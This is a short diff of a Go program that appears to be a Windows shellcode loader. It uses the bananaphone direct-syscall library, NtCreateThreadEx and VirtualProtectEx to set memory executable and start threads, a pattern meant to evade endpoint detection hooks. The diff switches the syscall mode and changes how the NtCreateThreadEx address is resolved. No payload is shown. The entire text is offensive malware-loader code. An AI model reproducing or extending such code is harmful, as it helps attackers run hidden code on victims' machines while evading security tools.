@@ -1,9 +1,6 @@
 package main
 
 import (
-	//"crypto/sha1"
-	//"crypto/sha256"
-	//"encoding/hex"
 	"fmt"
 	"syscall"
 	"unsafe"
@@ -34,15 +31,15 @@ func main() {
 	kernel32DLL := windows.NewLazySystemDLL("kernel32.dll")
 	VirtualProtectEx := kernel32DLL.NewProc("VirtualProtectEx")
 
-	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
 	if e != nil {
 		panic(e)
 	}
 
-	mess, e := bp.GetFuncPtr("NtCreateThreadEx")
+	mess:= syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateThreadEx").Addr()
 	//fmt.Printf("%x\n", mess)
-	if e != nil {
-		panic(e)
+	if mess == 0{
+		panic(fmt.Errorf("NtCreateThreadEx 获取错误"))
 	}
 
 	oldProtect := windows.PAGE_EXECUTE_READ
